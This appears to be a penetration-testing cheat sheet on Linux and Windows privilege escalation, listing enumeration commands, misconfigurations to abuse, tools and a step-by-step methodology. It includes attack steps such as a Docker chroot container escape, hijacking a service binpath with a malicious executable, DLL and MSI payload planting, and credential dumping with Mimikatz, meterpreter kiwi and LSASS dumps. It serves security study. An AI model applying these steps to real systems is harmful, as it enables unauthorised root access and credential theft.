# Privilege Escalation Bible

## Linux Privilege Escalation

### SUID/SGID Binaries
- `find / -perm -4000 -type f 2>/dev/null` - Find SUID binaries
- `find / -perm -2000 -type f 2>/dev/null` - Find SGID binaries
- `linpeas.sh` - Comprehensive Linux enumeration
- `linenum.sh` - Linux privilege escalation checker

### Sudo Misconfigurations
- `sudo -l` - List allowed sudo commands
- `sudo su` - Switch to root if NOPASSWD
- `sudo bash` - Spawn root shell

### Kernel Exploits
- `uname -a` - Get kernel version
- `cat /etc/os-release` - Get OS version
- `linux-exploit-suggester.py` - Find applicable exploits
- `searchsploit <kernel>` - Search Exploit-DB

### Capabilities
- `getcap -r / 2>/dev/null` - Find binaries with capabilities
- Abuse capabilities like `cap_setuid`

### Cron Jobs
- `ls -la /etc/cron.d/`
- `cat /etc/crontab`
- `ls -la /var/spool/cron/`

### NFS Root Squashing
- If NFS share has `no_root_squash`, mount and create SUID binary

### Docker Privileges
- `docker group` membership
- `docker run -v /:/host busybox chroot /host` - Container escape

### Path Hijacking
- writable directory in PATH before legitimate binary

## Windows Privilege Escalation

### Service Misconfigurations
- `whoami /priv` - Current privileges
- `accesschk.exe -uwcqv "Authenticated Users" *` - Weak service perms
- `sc qc <service>` - Query service config
- `sc config <service> binpath= "malicious.exe"` - Modify service

### Unquoted Service Paths
- Find services with unquoted paths and writable directories
- Place malicious binary in path

### Registry Misconfigurations
- `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`
- Modify autorun registry keys

### AlwaysInstallElevated
- `reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"`
- Create MSI payload

### SeImpersonatePrivilege
- Potato family exploits (Juicy Potato, PrintSpoofer)
- `seImpersonateToken` abuse

### Stored Credentials
- `cmdkey /list` - Saved credentials
- `meterpreter > load kiwi` - Credential dumping

### DLL Hijacking
- Find missing DLLs loaded by high-privilege apps
- Place malicious DLL in search path

### Kernel Exploits
- `systeminfo` - Gather system info
- `windows-exploit-suggester.py` - Find applicable exploits

### Password Spraying
- Spray collected credentials against other services

## Tools
- winPEAS.exe - Windows privilege escalation
- PowerUp.ps1 - Windows service enumeration
- SharpUp.exe - C# implementation of PowerUp
- Seatbelt.exe - Security-related host inspection
- Rubeus.exe - Kerberos abuse
- Mimikatz.exe - Credential dumping
- procdump.exe - LSASS dump
- SharpDPAPI.exe - DPAPI decryption
- LSASS dump + mimikatz

## Methodology
1. Enumerate current user and privileges
2. Check for SUID/SGID binaries (Linux)
3. Check sudo permissions
4. Enumerate services and scheduled tasks
5. Look for writable directories in PATH
6. Check for kernel exploits
7. Enumerate capabilities/capabilities
8. Check for cron jobs
9. Look for credentials in config files
10. Check Docker group membership

## References
- GTFOBins - https://gtfobins.github.io/
- PayloadsAllTheThings - Windows Privilege Escalation
- HackTricks - Linux/Windows Privilege Escalation